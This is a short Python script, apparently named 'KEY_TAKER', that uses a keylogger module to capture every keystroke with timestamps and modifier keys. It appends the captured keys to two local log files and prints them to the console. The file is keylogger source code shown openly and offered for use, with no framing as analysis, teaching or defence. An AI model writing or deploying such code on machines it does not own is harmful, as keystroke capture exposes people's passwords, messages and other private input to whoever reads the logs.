import keylogger
import time

now = time.time()
done = lambda: False

logFile = open('KEY_TAKER-log.log',"a+")
textedLog = open('KEY_TAKER-text.log', "a+")

def print_keys(t, modifiers, keys): print "%.2f   %r   %r\n" % (t, keys, modifiers)

def logStuff(t, modifiers, keys):
    logFile.write("%.2f   %r   %r\n" % (t, keys, modifiers))
    textedLog.write('%r' % keys)
    print(keys)

keylogger.log(done, logStuff)
